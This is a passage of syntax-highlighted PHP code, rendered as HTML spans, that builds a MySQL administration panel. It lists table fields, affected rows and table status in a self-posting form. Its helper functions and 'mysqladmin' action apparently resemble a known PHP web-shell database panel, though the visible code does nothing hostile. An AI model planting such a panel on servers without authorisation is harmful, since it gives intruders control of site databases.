<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">for</span>($<span style="color: #eeeeec;">i</span>=<span style="color: #eeeeec; background-color: #2e3436;">0</span>;$<span style="color: #eeeeec;">i</span>&lt;$<span style="color: #eeeeec;">fieldnum</span>;$<span style="color: #eeeeec;">i</span>++){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">name</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_field_name(</span>$<span style="color: #eeeeec;">result</span>, $<span style="color: #eeeeec;">i</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">type</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_field_type(</span>$<span style="color: #eeeeec;">result</span>, $<span style="color: #eeeeec;">i</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">len</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_field_len(</span>$<span style="color: #eeeeec;">result</span>, $<span style="color: #eeeeec;">i</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)"</span>.(($<span style="color: #eeeeec;">rowdb</span>[$<span style="color: #eeeeec;">name</span>][<span style="color: #ad7fa8; font-style: italic;">'Key'</span>] == <span style="color: #ad7fa8; font-style: italic;">'UNI'</span> || $<span style="color: #eeeeec;">rowdb</span>[$<span style="color: #eeeeec;">name</span>][<span style="color: #ad7fa8; font-style: italic;">'Key'</span>] == <span style="color: #ad7fa8; font-style: italic;">'PRI'</span>) ? <span style="color: #ad7fa8; font-style: italic;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>).($<span style="color: #eeeeec;">rowdb</span>[$<span style="color: #eeeeec;">name</span>][<span style="color: #ad7fa8; font-style: italic;">'Extra'</span>] == <span style="color: #ad7fa8; font-style: italic;">'auto_increment'</span> ? <span style="color: #ad7fa8; font-style: italic;">'&lt;b&gt; - Auto&lt;/b&gt;'</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>).<span style="color: #ad7fa8; font-style: italic;">"&lt;/span&gt;&lt;/td&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">tbfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span>$<span style="color: #eeeeec;">multipage</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">break</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">case</span> <span style="color: #8ae234;">2</span>:
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">ar</span> = <span style="color: #eeeeec; background-color: #2e3436;">mysql_affected_rows(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;affected rows : &lt;b&gt;'</span>.$<span style="color: #eeeeec;">ar</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/b&gt;&lt;/h2&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">break</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">query</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"SHOW TABLE STATUS"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">table_num</span> = $<span style="color: #eeeeec;">table_rows</span> = $<span style="color: #eeeeec;">data_size</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tabledb</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span>($<span style="color: #eeeeec;">table</span> = <span style="color: #eeeeec; background-color: #2e3436;">mysql_fetch_array(</span>$<span style="color: #eeeeec;">query</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">data_size</span> = $<span style="color: #eeeeec;">data_size</span> + $<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Data_length'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">table_rows</span> = $<span style="color: #eeeeec;">table_rows</span> + $<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Rows'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Data_length'</span>] = <span style="color: #eeeeec; background-color: #2e3436;">sizecount(</span>$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Data_length'</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">table_num</span>++;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tabledb</span>[] = $<span style="color: #eeeeec;">table</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">data_size</span> = <span style="color: #eeeeec; background-color: #2e3436;">sizecount(</span>$<span style="color: #eeeeec;">data_size</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">unset(</span>$<span style="color: #eeeeec;">table</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;table border="0" cellpadding="0" cellspacing="0"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;form action="'</span>.$<span style="color: #eeeeec;">self</span>.<span style="color: #ad7fa8; font-style: italic;">'" method="POST"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'mysqladmin'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span>$<span style="color: #eeeeec;">dbform</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td width="2%" align="center"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">highver</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span> ($<span style="color: #eeeeec;">tabledb</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">key</span> =&gt; $<span style="color: #eeeeec;">table</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">thisbg</span> = <span style="color: #eeeeec; background-color: #2e3436;">bg(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="'</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'\';"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name="table[]" value="'</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Name'</span>].<span style="color: #ad7fa8; font-style: italic;">'" /&gt;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Name'</span>].<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;'</span>.$<span style="color: #eeeeec;">table</span>[<span style="color: #ad7fa8; font-style: italic;">'Name'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt;&lt;/td&gt;'</span>);
